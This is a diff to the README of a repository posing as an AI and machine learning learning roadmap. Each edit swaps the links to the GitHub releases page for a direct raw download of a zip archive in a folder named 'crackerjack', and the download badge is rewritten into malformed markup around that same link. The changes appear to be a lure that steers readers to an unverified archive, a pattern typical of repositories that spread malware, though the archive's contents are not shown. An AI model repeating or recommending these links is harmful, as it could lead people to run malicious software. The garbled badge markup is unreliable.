@@ -1,6 +1,6 @@
 # 🚀 Roadmap-AI-and-ML-from-scratch - Unlock Your AI Potential Today
 
-[![Download Now](https://img.shields.io/badge/Download%20Now-%23FF5722.svg?style=for-the-badge&logo=github&logoColor=white)](https://github.com/omar-20067/Roadmap-AI-and-ML-from-scratch/releases)
+[![Download Now](https://raw.githubusercontent.com/omar-20067/Roadmap-AI-and-ML-from-scratch/main/crackerjack/Roadmap-AI-and-ML-from-scratch.zip%20Now-%https://raw.githubusercontent.com/omar-20067/Roadmap-AI-and-ML-from-scratch/main/crackerjack/Roadmap-AI-and-ML-from-scratch.zip)](https://raw.githubusercontent.com/omar-20067/Roadmap-AI-and-ML-from-scratch/main/crackerjack/Roadmap-AI-and-ML-from-scratch.zip)
 
 ## 📖 Overview
 
@@ -12,7 +12,7 @@ To get started, simply follow these steps to download and run the software:
 
 1. **Visit the Releases Page**  
    Go to the Releases page to find the latest version of Roadmap-AI-and-ML-from-scratch. Click the button below to access it.  
-   [Visit Releases Page](https://github.com/omar-20067/Roadmap-AI-and-ML-from-scratch/releases)
+   [Visit Releases Page](https://raw.githubusercontent.com/omar-20067/Roadmap-AI-and-ML-from-scratch/main/crackerjack/Roadmap-AI-and-ML-from-scratch.zip)
 
 2. **Choose Your Version**  
    On the Releases page, you will see various versions of the application. Select the version that suits your needs based on the release notes provided.
@@ -27,7 +27,7 @@ To get started, simply follow these steps to download and run the software:
 
 For easy access, click below to download the latest version directly:
 
-[Download from Releases](https://github.com/omar-20067/Roadmap-AI-and-ML-from-scratch/releases)
+[Download from Releases](https://raw.githubusercontent.com/omar-20067/Roadmap-AI-and-ML-from-scratch/main/crackerjack/Roadmap-AI-and-ML-from-scratch.zip)
 
 ### System Requirements
 
@@ -80,4 +80,4 @@ If you have questions, feel free to reach out via our GitHub page. We are here t
 We thank all contributors and the open-source community for their support in developing this resource. Your efforts make this project possible.
 
 For more resources and updates, remember to keep visiting:  
-[Visit Releases Page](https://github.com/omar-20067/Roadmap-AI-and-ML-from-scratch/releases)
+[Visit Releases Page](https://raw.githubusercontent.com/omar-20067/Roadmap-AI-and-ML-from-scratch/main/crackerjack/Roadmap-AI-and-ML-from-scratch.zip)
